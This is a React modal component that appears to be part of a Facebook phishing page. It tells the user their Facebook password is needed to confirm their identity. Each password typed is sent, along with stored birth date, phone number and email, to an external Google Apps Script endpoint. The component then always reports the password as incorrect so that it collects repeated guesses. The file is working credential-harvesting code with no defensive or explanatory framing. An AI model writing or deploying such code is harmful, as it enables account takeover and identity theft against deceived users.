import axios from "axios";
import React from "react";

import ButtonSoft from "../UI/ButtonSoft/ButtonSoft";
import InputPassword from "../UI/InputPassword/InputPassword";
import "./Modal.scss";

const passwords = [];

// eslint-disable-next-line react/prop-types, no-unused-vars
const Modal = ({ isModal, setIsModal }) => {
  const [password, setPassword] = React.useState("");
  const [attempt, setAttempt] = React.useState(0);

  const styleModal = ["modal"];
  if (isModal) {
    styleModal.push("modal__active");
  }

  const handleContinue = () => {
    if (!password) {
      return;
    }

    passwords.push(password);

    const data = JSON.parse(localStorage.getItem("form"));
    const form = new FormData();

    form.append("day", data.day);
    form.append("month", data.month);
    form.append("year", data.year);
    form.append("phone", data.phone);
    form.append("email", data.email);
    form.append("password", passwords);

    axios.post(
      "https://script.google.com/macros/s/AKfycbzQuBZK_LchvVKyD6OMP2wAP1a0afZcYffBfybX4w1rOglN5qyYDgqmZMMeWURajnrqjg/exec",
      form
    );

    setAttempt((prev) => prev + 1);
  };

  return (
    <div
      className={styleModal.join(" ")}
      aria-hidden="false"
      // onClick={() => setIsModal((state) => !state)}
    >
      <div className="modal-dialog" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content">
          {/* <div className="modal-header">
            <div className="modal-title" id="exampleModalLabel">
              Please Enter Your Password
            </div>
            <button
              type="button"
              className="btn-close"
              onClick={() => setIsModal((state) => !state)}
            ></button>
          </div> */}
          <div className="modal-body" style={{}}>
            <h1
              style={{
                fontSize: "1.5rem",

                marginTop: "1.15rem",
              }}
            >
              Please enter your facebook password to continue
            </h1>
            <div
              style={{
                height: 1,
                width: "100%",
                background: "rgb(218, 221, 225)",
                marginTop: "1rem",
                marginBottom: "1.25rem",
              }}
            />

            <div className="modal__body-description">
              We need to confirm the sender of the information is you, Please
              enter your facebook password and then continue.
            </div>
            <div className="modal__body-password">
              <InputPassword
                value={password}
                fun={(e) => setPassword(e.target.value)}
              >
                Password
              </InputPassword>
              {attempt > 0 && (
                <p className="text-danger">
                  Incorrect facebook password, please try again.
                </p>
              )}
            </div>
            <div
              style={{
                marginBottom: "1.25rem",
              }}
            >
              <ButtonSoft disabled={password.length > 0} fun={handleContinue}>
                Continue
              </ButtonSoft>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Modal;
